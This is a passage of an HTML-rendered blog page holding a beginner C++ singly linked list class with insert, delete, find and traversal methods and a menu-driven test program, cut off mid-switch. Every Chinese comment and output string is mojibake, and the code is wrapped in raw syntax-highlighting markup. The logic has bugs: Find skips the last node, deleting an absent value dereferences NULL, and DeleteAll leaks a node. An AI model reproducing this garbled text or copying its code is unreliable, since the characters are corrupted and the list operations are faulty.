class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><span class="line">C++å•é“¾è¡¨çš„æ“ä½œ</span><br><span class="line"><span class="number">2017</span><span class="number">-12</span><span class="number">-25</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">// å•é“¾è¡¨.cpp: å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"> <span class="comment">//Author:kgvito </span></span><br><span class="line"> <span class="comment">//Date: 2017.12.25</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"> using namespace <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> Node ElemType</span></span><br><span class="line"> <span class="meta">#<span class="keyword">define</span> ERROR NULL</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">//æ„å»ºä¸€ä¸ªèŠ‚ç‚¹ç±»</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>                          </span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     <span class="type">int</span> data;     <span class="comment">//æ•°æ®åŸŸ</span></span><br><span class="line">     Node * next;  <span class="comment">//æŒ‡é’ˆåŸŸ</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//æ„å»ºä¸€ä¸ªå•é“¾è¡¨ç±»</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">LinkList</span>                      </span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">     LinkList();                      <span class="comment">//æ„å»ºä¸€ä¸ªå•é“¾è¡¨;</span></span><br><span class="line">     ~LinkList();                  <span class="comment">//é”€æ¯ä¸€ä¸ªå•é“¾è¡¨;</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span>;   <span class="comment">//åˆ›å»ºä¸€ä¸ªå•é“¾è¡¨</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">TravalLinkList</span><span class="params">()</span>;        <span class="comment">//éå†çº¿æ€§è¡¨</span></span><br><span class="line">     <span class="type">int</span> <span class="title function_">GetLength</span><span class="params">()</span>;              <span class="comment">//è·å–çº¿æ€§è¡¨é•¿åº¦</span></span><br><span class="line">     <span class="type">bool</span> <span class="title function_">IsEmpty</span><span class="params">()</span>;               <span class="comment">//åˆ¤æ–­å•é“¾è¡¨æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">     ElemType * <span class="title function_">Find</span><span class="params">(DataType data)</span>; <span class="comment">//æŸ¥æ‰¾èŠ‚ç‚¹</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtEnd</span><span class="params">(DataType data)</span>;            <span class="comment">//åœ¨å°¾éƒ¨æ’å…¥æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span>;    <span class="comment">//åœ¨æŒ‡å®šä½ç½®æ’å…¥æŒ‡å®šå…ƒç´ </span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">InsertElemAtHead</span><span class="params">(DataType data)</span>;           <span class="comment">//åœ¨å¤´éƒ¨æ’å…¥æŒ‡å®šå…ƒç´ </span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtEnd</span><span class="params">()</span>;       <span class="comment">//åœ¨å°¾éƒ¨åˆ é™¤å…ƒç´ </span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteAll</span><span class="params">()</span>;             <span class="comment">//åˆ é™¤æ‰€æœ‰æ•°æ®</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtPoint</span><span class="params">(DataType data)</span>;     <span class="comment">//åˆ é™¤æŒ‡å®šçš„æ•°æ®</span></span><br><span class="line">     <span class="type">void</span> <span class="title function_">DeleteElemAtHead</span><span class="params">()</span>;      <span class="comment">//åœ¨å¤´éƒ¨åˆ é™¤èŠ‚ç‚¹</span></span><br><span class="line"> private:</span><br><span class="line">     ElemType * head;              <span class="comment">//å¤´ç»“ç‚¹</span></span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åˆå§‹åŒ–å•é“¾è¡¨</span></span><br><span class="line"> LinkList::LinkList()                  </span><br><span class="line"> &#123;</span><br><span class="line">     head = new ElemType;            </span><br><span class="line">     head-&gt;data = <span class="number">0</span>;               <span class="comment">//å°†å¤´ç»“ç‚¹çš„æ•°æ®åŸŸå®šä¹‰ä¸º0</span></span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;            <span class="comment">//å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªå®šä¹‰ä¸ºNULL</span></span><br><span class="line"> &#125;     </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//é”€æ¯å•é“¾è¡¨</span></span><br><span class="line"> LinkList::~LinkList()</span><br><span class="line"> &#123;</span><br><span class="line">     delete head;                 <span class="comment">//åˆ é™¤å¤´ç»“ç‚¹</span></span><br><span class="line"> &#125; </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åˆ›å»ºä¸€ä¸ªå•é“¾è¡¨</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::CreateLinkList</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType *pnew, *ptemp;</span><br><span class="line">     ptemp = head;</span><br><span class="line">     <span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;       <span class="comment">//å½“è¾“å…¥çš„å€¼æœ‰è¯¯æ—¶ï¼Œå¤„ç†å¼‚å¸¸</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¾“å…¥çš„èŠ‚ç‚¹ä¸ªæ•°æœ‰è¯¯&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n;i++) &#123;        <span class="comment">//å°†å€¼ä¸€ä¸ªä¸€ä¸ªæ’å…¥å•é“¾è¡¨ä¸­</span></span><br><span class="line">         pnew = new ElemType;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥ç¬¬&quot;</span> &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">&quot;ä¸ªå€¼: &quot;</span> ;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; pnew-&gt;data;</span><br><span class="line">         pnew-&gt;next = <span class="literal">NULL</span>;          <span class="comment">//æ–°èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªåœ°å€ä¸ºNULL</span></span><br><span class="line">         ptemp-&gt;next = pnew;         <span class="comment">//å½“å‰ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªåœ°å€è®¾ä¸ºæ–°èŠ‚ç‚¹</span></span><br><span class="line">         ptemp = pnew;               <span class="comment">//å°†å½“å‰ç»“ç‚¹è®¾ä¸ºæ–°èŠ‚ç‚¹</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//éå†å•é“¾è¡¨</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::TravalLinkList</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span> || head-&gt;next ==<span class="literal">NULL</span>) &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;é“¾è¡¨ä¸ºç©ºè¡¨&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     ElemType *p = head;                 <span class="comment">//å¦æŒ‡é’ˆæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">     <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)        <span class="comment">//å½“æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªåœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œå¾ªç¯è¾“å‡ºpçš„æ•°æ®åŸŸ</span></span><br><span class="line">     &#123;</span><br><span class="line">         p = p-&gt;next;               <span class="comment">//pæŒ‡å‘pçš„ä¸‹ä¸€ä¸ªåœ°å€</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//è·å–å•é“¾è¡¨çš„é•¿åº¦</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">LinkList::GetLength</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int</span> count = <span class="number">0</span>;                  <span class="comment">//å®šä¹‰countè®¡æ•°</span></span><br><span class="line">     ElemType *p = head-&gt;next;           <span class="comment">//å®šä¹‰pæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                <span class="comment">//å½“æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªåœ°å€ä¸ä¸ºç©ºæ—¶ï¼Œcount+1</span></span><br><span class="line">     &#123;</span><br><span class="line">         count++;                  </span><br><span class="line">         p = p-&gt;next;                <span class="comment">//pæŒ‡å‘pçš„ä¸‹ä¸€ä¸ªåœ°å€</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> count;                   <span class="comment">//è¿”å›countçš„æ•°æ®</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åˆ¤æ–­å•é“¾è¡¨æ˜¯å¦ä¸ºç©º</span></span><br><span class="line"> <span class="type">bool</span> <span class="title function_">LinkList::IsEmpty</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (head-&gt;next == <span class="literal">NULL</span>) &#123;                 </span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//æŸ¥æ‰¾èŠ‚ç‚¹</span></span><br><span class="line"> ElemType * <span class="title function_">LinkList::Find</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;                           <span class="comment">//å½“ä¸ºç©ºè¡¨æ—¶ï¼ŒæŠ¥å¼‚å¸¸</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;æ­¤é“¾è¡¨ä¸ºç©ºé“¾è¡¨&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> ERROR;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)               <span class="comment">//å¾ªç¯æ¯ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">if</span> (p-&gt;data == data) &#123;</span><br><span class="line">                 <span class="keyword">return</span> p;                     <span class="comment">//è¿”å›æŒ‡é’ˆåŸŸ</span></span><br><span class="line">             &#125;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;                           <span class="comment">//æœªæŸ¥è¯¢åˆ°ç»“æœ</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨å°¾éƒ¨æ’å…¥æŒ‡å®šçš„å…ƒç´ </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtEnd</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//å®šä¹‰ä¸€ä¸ªNodeç»“ç‚¹æŒ‡é’ˆnewNode</span></span><br><span class="line">     newNode-&gt;next = <span class="literal">NULL</span>;         <span class="comment">//å®šä¹‰newNodeçš„æ•°æ®åŸŸå’ŒæŒ‡é’ˆåŸŸ</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//å®šä¹‰æŒ‡é’ˆpæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//å½“å¤´ç»“ç‚¹ä¸ºç©ºæ—¶ï¼Œè®¾ç½®newNodeä¸ºå¤´ç»“ç‚¹</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>                          <span class="comment">//å¾ªç¯çŸ¥é“æœ€åä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°†newNodeæ”¾ç½®åœ¨æœ€å</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = newNode;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨æŒ‡å®šä½ç½®æ’å…¥æŒ‡å®šå…ƒç´ </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtIndex</span><span class="params">(DataType data,<span class="type">int</span> n)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">if</span> (n&lt;<span class="number">1</span> || n&gt;GetLength())                   <span class="comment">//è¾“å…¥æœ‰è¯¯æŠ¥å¼‚å¸¸</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¾“å…¥çš„å€¼é”™è¯¯&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = new ElemType;        <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„èŠ‚ç‚¹</span></span><br><span class="line">         ptemp-&gt;data = data;                     <span class="comment">//å®šä¹‰æ•°æ®åŸŸ</span></span><br><span class="line">         ElemType * p = head;                    <span class="comment">//åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">         <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span> (n &gt; i)                           <span class="comment">//éå†åˆ°æŒ‡å®šçš„ä½ç½®</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">             i++;</span><br><span class="line">         &#125;</span><br><span class="line">         ptemp-&gt;next = p-&gt;next;                 <span class="comment">//å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°æŒ‡å®šä½ç½®</span></span><br><span class="line">         p-&gt;next = ptemp;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨å¤´éƒ¨æ’å…¥æŒ‡å®šå…ƒç´ </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::InsertElemAtHead</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * newNode = new ElemType;    <span class="comment">//å®šä¹‰ä¸€ä¸ªNodeç»“ç‚¹æŒ‡é’ˆnewNode</span></span><br><span class="line">     newNode-&gt;data = data;</span><br><span class="line">     ElemType * p = head;              <span class="comment">//å®šä¹‰æŒ‡é’ˆpæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">     <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;           <span class="comment">//å½“å¤´ç»“ç‚¹ä¸ºç©ºæ—¶ï¼Œè®¾ç½®newNodeä¸ºå¤´ç»“ç‚¹</span></span><br><span class="line">         head = newNode;</span><br><span class="line">     &#125;</span><br><span class="line">     newNode-&gt;next = p-&gt;next;          <span class="comment">//å°†æ–°èŠ‚ç‚¹æ’å…¥åˆ°æŒ‡å®šä½ç½®</span></span><br><span class="line">     p-&gt;next = newNode;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨å°¾éƒ¨åˆ é™¤å…ƒç´ </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtEnd</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;          <span class="comment">//åˆ›å»ºä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">     ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//åˆ›å»ºä¸€ä¸ªå ä½èŠ‚ç‚¹</span></span><br><span class="line">     <span class="keyword">if</span> (p-&gt;next == <span class="literal">NULL</span>) &#123;        <span class="comment">//åˆ¤æ–­é“¾è¡¨æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;å•é“¾è¡¨ç©º&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>)   <span class="comment">//å¾ªç¯åˆ°å°¾éƒ¨çš„å‰ä¸€ä¸ª</span></span><br><span class="line">         &#123;</span><br><span class="line">             ptemp = p;            <span class="comment">//å°†ptempæŒ‡å‘å°¾éƒ¨çš„å‰ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">             p = p-&gt;next;          <span class="comment">//pæŒ‡å‘æœ€åä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">         &#125;</span><br><span class="line">         delete p;                <span class="comment">//åˆ é™¤å°¾éƒ¨èŠ‚ç‚¹</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åˆ é™¤æ‰€æœ‰æ•°æ®</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteAll</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head-&gt;next;</span><br><span class="line">     ElemType * ptemp = new ElemType;</span><br><span class="line">     <span class="keyword">while</span> (p != <span class="literal">NULL</span>)                    <span class="comment">//åœ¨å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹é€ä¸ªåˆ é™¤èŠ‚ç‚¹</span></span><br><span class="line">     &#123;</span><br><span class="line">         ptemp = p;</span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         head-&gt;next = p;</span><br><span class="line">         ptemp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">         delete ptemp;</span><br><span class="line">     &#125;</span><br><span class="line">     head-&gt;next = <span class="literal">NULL</span>;                 <span class="comment">//å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æŒ‡å‘NULL</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åˆ é™¤æŒ‡å®šçš„æ•°æ®</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtPoint</span><span class="params">(DataType data)</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * ptemp = Find(data);    <span class="comment">//æŸ¥æ‰¾åˆ°æŒ‡å®šæ•°æ®çš„èŠ‚ç‚¹ä½ç½®</span></span><br><span class="line">     <span class="keyword">if</span> (ptemp == head-&gt;next) &#123;        <span class="comment">//åˆ¤æ–­æ˜¯ä¸æ˜¯å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœæ˜¯å°±ä»å¤´éƒ¨åˆ äº†å®ƒ</span></span><br><span class="line">         DeleteElemAtHead();</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * p = head;          <span class="comment">//pæŒ‡å‘å¤´ç»“ç‚¹</span></span><br><span class="line">         <span class="keyword">while</span> (p-&gt;next != ptemp)      <span class="comment">//på¾ªç¯åˆ°æŒ‡å®šä½ç½®çš„å‰ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">         &#123;</span><br><span class="line">             p = p-&gt;next;</span><br><span class="line">         &#125;</span><br><span class="line">         p-&gt;next = ptemp-&gt;next;         <span class="comment">//åˆ é™¤æŒ‡å®šä½ç½®çš„èŠ‚ç‚¹</span></span><br><span class="line">         delete ptemp;</span><br><span class="line">         ptemp = <span class="literal">NULL</span>;               </span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//åœ¨å¤´éƒ¨åˆ é™¤èŠ‚ç‚¹</span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">LinkList::DeleteElemAtHead</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     ElemType * p = head;</span><br><span class="line">     <span class="keyword">if</span> (p == <span class="literal">NULL</span> || p-&gt;next == <span class="literal">NULL</span>) &#123;   <span class="comment">//åˆ¤æ–­æ˜¯å¦ä¸ºç©ºè¡¨ï¼ŒæŠ¥å¼‚å¸¸</span></span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯¥é“¾è¡¨ä¸ºç©ºè¡¨&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         ElemType * ptemp = <span class="literal">NULL</span>;      <span class="comment">//åˆ›å»ºä¸€ä¸ªå ä½èŠ‚ç‚¹</span></span><br><span class="line">         p = p-&gt;next;</span><br><span class="line">         ptemp = p-&gt;next;              <span class="comment">//å°†å¤´ç»“ç‚¹çš„ä¸‹ä¸‹ä¸ªèŠ‚ç‚¹æŒ‡å‘å ä½èŠ‚ç‚¹</span></span><br><span class="line">         delete p;                     <span class="comment">//åˆ é™¤å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">         p = <span class="literal">NULL</span>;</span><br><span class="line">         head-&gt;next = ptemp;           <span class="comment">//å¤´ç»“ç‚¹çš„æŒ‡é’ˆæ›´æ¢</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//æµ‹è¯•å‡½æ•°</span></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line"> &#123;</span><br><span class="line">     LinkList l;</span><br><span class="line">     <span class="type">int</span> i;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1.åˆ›å»ºå•é“¾è¡¨   2.éå†å•é“¾è¡¨   3.è·å–å•é“¾è¡¨çš„é•¿åº¦   4.åˆ¤æ–­å•é“¾è¡¨æ˜¯å¦ä¸ºç©º   5.è·å–èŠ‚ç‚¹\n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6.åœ¨å°¾éƒ¨æ’å…¥æŒ‡å®šå…ƒç´    7.åœ¨æŒ‡å®šä½ç½®æ’å…¥æŒ‡å®šå…ƒç´    8.åœ¨å¤´éƒ¨æ’å…¥æŒ‡å®šå…ƒç´ \n&quot;</span>;</span><br><span class="line">     <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;9.åœ¨å°¾éƒ¨åˆ é™¤å…ƒç´    10.åˆ é™¤æ‰€æœ‰å…ƒç´    11.åˆ é™¤æŒ‡å®šå…ƒç´    12.åœ¨å¤´éƒ¨åˆ é™¤å…ƒç´    0.é€€å‡º&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;è¯·è¾“å…¥è¦æ‰§è¡Œçš„æ“ä½œ: &quot;</span>;</span><br><span class="line">         <span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line">         <span class="keyword">switch</span> (i)</span><br><span class="line">         &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="number">1</span>:</span><br><span 